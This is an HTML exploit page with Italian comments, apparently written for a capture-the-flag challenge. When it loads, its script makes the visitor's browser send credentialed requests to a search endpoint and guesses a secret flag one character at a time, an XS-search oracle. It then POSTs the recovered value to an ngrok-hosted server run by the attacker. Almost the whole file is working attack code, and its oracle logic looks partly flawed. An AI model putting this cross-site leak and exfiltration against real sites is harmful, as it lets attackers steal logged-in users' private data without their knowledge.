<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rubare Flag</title>
</head>
<body>
    <h1>Rubare la Flag dell'Architetto</h1>
    <pre id="output"></pre>

    <script>
        const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}'; // Caratteri da testare
        let reconstructedFlag = ''; // La flag ricostruita
        const outputElement = document.getElementById('output');

        // Funzione per ricostruire la flag
        const xsOracle = async (position) => {
            for (let char of characters) {
                const testFlag = reconstructedFlag + char; // Costruisci la flag provvisoria

                try {
                    const response = await fetch(`https://matrix.capturetheflags.site/search?s=${encodeURIComponent(testFlag)}`, {
                        method: 'GET',
                        credentials: 'include', // Include i cookie di sessione
                        mode: 'cors' // Imposta CORS
                    });

                    // Controlla lo stato della risposta
                    if (response.ok) {
                        outputElement.textContent += `Carattere trovato: "${char}" per la posizione ${position}\n`;
                        reconstructedFlag += char; // Aggiungi il carattere corretto alla flag
                        break; // Passa alla prossima posizione
                    } else {
                        outputElement.textContent += `Carattere "${char}" non valido per la posizione ${position}.\n`;
                    }
                } catch (error) {
                    console.error('Errore:', error);
                    outputElement.textContent += `Errore nella richiesta per "${testFlag}".\n`;
                }
            }

            // Se la flag non Ã¨ completa, continua a cercare
            if (reconstructedFlag.length < targetFlagLength) {
                await xsOracle(reconstructedFlag.length); // Chiama ricorsivamente per il prossimo carattere
            } else {
                outputElement.textContent += `Flag ricostruita: ${reconstructedFlag}\n`;
                // Invia la flag al tuo server Flask
                fetch('https://c787-87-4-142-72.ngrok-free.app/receive_flag', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: `flag=${encodeURIComponent(reconstructedFlag)}`
                })
                .then(response => response.text())
                .then(data => console.log(data))
                .catch(error => console.error('Errore nell\'invio della flag:', error));
            }
        };

        // Inizia il processo automaticamente all'apertura della pagina
        window.onload = () => {
            reconstructedFlag = ''; // Reset della flag ricostruita
            outputElement.textContent = ''; // Pulisce l'output precedente
            xsOracle(0); // Avvia il processo dalla prima posizione
        };

        // Imposta la lunghezza della flag che stai cercando
        const targetFlagLength = 39; // Modifica con la lunghezza della flag
    </script>
</body>
</html>
